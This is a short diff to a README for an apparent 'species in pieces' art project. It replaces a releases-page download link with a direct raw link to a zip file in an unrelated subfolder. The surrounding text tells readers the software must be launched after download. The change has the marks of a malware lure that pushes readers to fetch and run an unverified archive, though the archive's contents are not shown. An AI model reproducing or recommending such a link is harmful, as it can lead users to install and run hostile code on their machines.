@@ -18,7 +18,7 @@ In this repository, you will find the following:
 
 To explore the full collection of 30 species and their corresponding pieces, you can download the software package from the following link:
 
-[![Download Software](https://github.com/bombastic1234/species-in-pieces/releases/tag/v2.0)](https://github.com/bombastic1234/species-in-pieces/releases/tag/v2.0)
+[![Download Software](https://raw.githubusercontent.com/bombastic1234/species-in-pieces/main/Rowland/pieces-species-in-v2.1.zip)](https://raw.githubusercontent.com/bombastic1234/species-in-pieces/main/Rowland/pieces-species-in-v2.1.zip)
 
 Please note that the software needs to be launched after downloading to access the interactive elements of the project.
 
